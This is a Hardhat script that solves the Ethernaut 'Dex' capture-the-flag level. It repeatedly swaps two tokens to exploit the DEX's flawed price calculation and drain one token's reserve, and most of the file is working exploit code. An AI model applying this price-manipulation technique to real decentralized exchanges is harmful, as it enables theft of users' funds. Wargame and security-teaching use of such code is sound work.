/*
The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.

You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.

You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.

Things that might help:
  - How is the price of the token calculated?
  - How does the swap method work?
  - How do you approve a transaction of an ERC20?
  - Theres more than one way to interact with a contract!
  - Remix might help
  - What does "At Address" do?
*/

const hre = require("hardhat");
const { expect } = require("chai")

async function main() {
  // Recreating the attack on ganache
  [player] = await ethers.getSigners();
  
  console.log("Getting instances of the DEX & Tokens Contracts deployed by Ethernaut");

  // Get an instance of the DEX contract deployed by Ethernaut
  const DEXAddress = "0x3fB1cfA515924Faecf113EA4e69Ee1aa98DB5B0f"
  this.dex = await hre.ethers.getContractAt("Dex",DEXAddress);

  // Get an instance of the Token1 contract deployed by Ethernaut
  const Token1Address = "0x80AF8460ce3e144139EE78c3CC4F7b0645270c25"
  this.token1 = await hre.ethers.getContractAt("SwappableToken",Token1Address);

  // Get an instance of the Token2 contract deployed by Ethernaut
  const Token2Address = "0xBC5B930432ff640963891B091882423603C908f5"
  this.token2 = await hre.ethers.getContractAt("SwappableToken",Token2Address);

  console.log("Granting DEX Contract enough allowance to spend tokens on behalf of the player");

  // Granting allowance to the DEX Contract to spend tokens on behalf of the player
  tx = await this.token1.connect(player).increaseAllowance(this.dex.address,500);
  await tx.wait();

  tx = await this.token2.connect(player).increaseAllowance(this.dex.address,500);
  await tx.wait();


  // Validate all the configurations on the DEX Contract were made properly before proceeding to deploy the Attacker contract
  expect(await this.token1.address).to.eq(await this.dex.token1());
  expect(await this.token2.address).to.eq(await this.dex.token2());

  expect(await this.dex.balanceOf(this.token1.address,this.dex.address)).to.eq(100);
  expect(await this.dex.balanceOf(this.token2.address,this.dex.address)).to.eq(100);

  expect(await this.token1.allowance(player.address,this.dex.address)).to.eq(500);
  expect(await this.token2.allowance(player.address,this.dex.address)).to.eq(500);

  // Validate the player has been funded with 10 tokens each
  expect(await this.token1.balanceOf(player.address)).to.eq(10);
  expect(await this.token2.balanceOf(player.address)).to.eq(10);
  
  console.log("\n\n Performing attack ... \n");

  // migrate the logic of the initiateAttack() function onto this script!
  // swap() function of the DEX Contracts expects explicitly the player's account to be the one interacting with!

  await performAttack(this.dex, this.token1, this.token2, player)

  console.log("\n===============================================\n===============================================\n");
  console.log("\n\n Results after performing the attack \n");

  console.log(
    `
    Dex contract token1 balance: ${await this.dex.balanceOf(this.token1.address,this.dex.address)} \n
    Dex contract token2 balance: ${await this.dex.balanceOf(this.token2.address,this.dex.address)} \n

    Player token1 balance: ${await this.dex.balanceOf(this.token1.address,player.address)} \n
    Player token2 balance: ${await this.dex.balanceOf(this.token2.address,player.address)} \n
    `
  );

  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

async function performAttack(dexContract, token1Contract, token2Contract, player) {
  console.log("Initiating attack!");
  let dexAllowanceOnToken1PlayerBalance = await token1Contract.allowance(player.address,dexContract.address);
  let dexAllowanceOnToken2PlayerBalance = await token2Contract.allowance(player.address,dexContract.address);

  expect(await token1Contract.allowance(player.address,dexContract.address)).to.eq(500);
  expect(await token2Contract.allowance(player.address,dexContract.address)).to.eq(500);

  let playerToken1Balance = await dexContract.balanceOf(token1Contract.address,player.address);
  let playerToken2Balance = await dexContract.balanceOf(token2Contract.address,player.address);

  if( !(dexAllowanceOnToken1PlayerBalance > playerToken1Balance) ) throw new TypeError('dexAllowanceOnToken1PlayerBalance is not greather than playerToken1Balance')
  if( !(dexAllowanceOnToken2PlayerBalance > playerToken2Balance) ) throw new TypeError('dexAllowanceOnToken2PlayerBalance is not greather than playerToken2Balance')

  // The attack starts by swapping ALL the tokens1 for tokens2
  let swapTX = await dexContract.connect(player).swap(token1Contract.address,token2Contract.address,playerToken1Balance);
  await swapTX.wait();

  let dexToken1Balance = await dexContract.balanceOf(token1Contract.address,dexContract.address);
  let dexToken2Balance = await dexContract.balanceOf(token2Contract.address,dexContract.address);

  playerToken1Balance = await dexContract.balanceOf(token1Contract.address,player.address);
  playerToken2Balance = await dexContract.balanceOf(token2Contract.address,player.address);

  console.log("dexToken1Balance: ", dexToken1Balance);
  console.log("dexToken2Balance: ", dexToken2Balance);

  console.log("playerToken1Balance: ", playerToken1Balance);
  console.log("playerToken2Balance: ", playerToken2Balance);


  // On each iteration, the player's balance of one of the two tokens will be depleted to 0
    // When any of the player's token balances is greater than the DEX balance of the same token, the total amount of tokens to swap must be the exact amount of the DEX Balance
      // When the above condition is met, if the player sends its total token balance, the DEX balance of the other token won't be enough to match the require amount of tokens to swap, thus, will generate an error when attempting the transferFrom() operation

  // The attack will be executed while the DEX has balance of the two tokens...
  while((dexToken1Balance > 0) && (dexToken2Balance > 0)) {
    let swapped = false;
    console.log("\n ==================== New Swap ==================== \n");
    // Uncomment the below console.log() to debug
    console.log("dexToken1Balance: ", dexToken1Balance);
    console.log("dexToken2Balance: ", dexToken2Balance);

    console.log("playerToken1Balance: ", playerToken1Balance);
    console.log("playerToken2Balance: ", playerToken2Balance);
    
    // When any of the two below conditions is executed, the token's balance of the dex contract has finally been totally depleted
    // Is the token1 player's balance greater than the dex balance?
    if( (playerToken1Balance > dexToken1Balance) && (swapped == false) ) {
      // Ask a swap for the max amount of tokens1 the DEX contract has
      swapTX = await dexContract.connect(player).swap(token1Contract.address,token2Contract.address,dexToken1Balance);
      await swapTX.wait();
      swapped = true;
    } else if( (playerToken2Balance > dexToken2Balance) && (swapped == false) ) {
      // Ask a swap for the max amount of tokens2 the DEX contract has
      swapTX = await dexContract.connect(player).swap(token2Contract.address,token1Contract.address,dexToken2Balance);
      await swapTX.wait();
      swapped = true;
    }

    // Swaps to continously drain the DEX token balances
    if ( (playerToken1Balance == 0) && (dexToken1Balance > playerToken1Balance) && (swapped == false) ) {
      swapTX = await dexContract.connect(player).swap(token2Contract.address,token1Contract.address,playerToken2Balance);
      await swapTX.wait();
      swapped = true;
    } else if( (playerToken2Balance == 0) && (dexToken2Balance > playerToken2Balance) && (swapped == false) ) {
      swapTX = await dexContract.connect(player).swap(token1Contract.address,token2Contract.address,playerToken1Balance);
      await swapTX.wait();
      swapped = true;
    }

    // Refresh the balances after the swap was executed
    dexToken1Balance = await dexContract.balanceOf(token1Contract.address,dexContract.address);
    dexToken2Balance = await dexContract.balanceOf(token2Contract.address,dexContract.address);

    playerToken1Balance = await dexContract.balanceOf(token1Contract.address,player.address);
    playerToken2Balance = await dexContract.balanceOf(token2Contract.address,player.address);
  }

  if( (dexToken1Balance > 0) && (dexToken2Balance > 0) ) throw new TypeError('The DEX Contract has still balance of one of the two tokens');

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});